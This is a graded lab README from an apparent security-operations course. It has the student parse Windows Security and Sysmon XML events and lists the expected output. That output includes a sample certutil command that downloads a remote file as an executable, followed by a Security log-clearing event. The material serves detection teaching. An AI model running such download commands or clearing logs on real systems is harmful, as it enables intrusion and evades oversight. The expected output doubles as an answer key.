# m02l04-03 · Read Security and Sysmon events with ElementTree

**Lesson:** [Windows Event Logs, Sysmon & Linux Auditd Telemetry](https://learnsome.tech/learn/secops-course/m02l04) (lesson 2.4, module 2: Log Ingestion & Detection Engineering) · Pro  
**Check:** Graded

## Goal

You can parse Windows Security and Sysmon XML, reassemble auditd records, and write and read a Kubernetes audit policy to see who touched secrets or exec'd into pods.

In the lesson: The export holds four events inside an Events root element, which is what wevtutil produces when you ask it for a root element. Every element lives in the Windows event namespace, so each lookup passes the namespace map; forgetting it is the usual reason a first parser finds nothing. The table of wanted fields is keyed on provider and event id together. For each event, the program reads the System block, then builds a dictionary from the named Data elements and prints the fields that event type needs. Read the output as a story. A remote desktop logon, type ten, for J Smith. Three minutes later, certutil downloading a file, seen by both Security and Sysmon. Six minutes after that, event one one zero two: the Security log was cleared.

## Files

- [`starter/events.xml`](starter/events.xml)
- [`starter/winevt.py`](starter/winevt.py): the listing from the lesson
- [`expected.txt`](expected.txt): the output the check compares with
- [`check.json`](check.json): how `./check` runs and checks this lab

## Steps

1. Go to the starter: `cd labs/m02l04/m02l04-03/starter`
2. Read `winevt.py` the way the lesson builds it:
   - Lines 1–3: passes the namespace map
   - Lines 4–9: the table of wanted fields
   - Lines 10–16: reads the system block
   - Lines 17–19: prints the fields that event type needs
3. Run it: `python3 winevt.py`.
4. Check it from the repository root: `./check m02l04-03`.

## Expected output

```text
09:38:02 Security-Auditing 4624 jsmith | 10 | 198.51.100.23
09:41:12 Security-Auditing 4688 C:\Windows\System32\certutil.exe | certutil -urlcache -f http://203.0.113.9/a.txt a.exe
09:41:12 Sysmon               1 cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.txt a.exe | CORP\jsmith
09:47:30 Eventlog          1102
```

## How to check

`./check m02l04-03` copies `starter/` into a scratch directory and runs `python3 winevt.py` there, the way the site's lab sandbox does: that directory is the working directory and `HOME`, `LANG=C.UTF-8`, `TZ=UTC`, a limit of 10 seconds and 256 KiB of output per stream.

It passes when the output matches `expected.txt` by the site's rules, within the limits. Standard output is compared line by line; spaces at the end of a line and blank lines at the end do not count. If that differs, standard output followed by standard error is compared with Python traceback frames and blank lines set aside, so a lesson that shows an error passes when your program prints the same error. A pass here is a pass on the site.

---

[Open the lesson on LearnSome.tech](https://learnsome.tech/learn/secops-course/m02l04) · [All labs of this lesson](../README.md) · [Course README](../../../README.md)
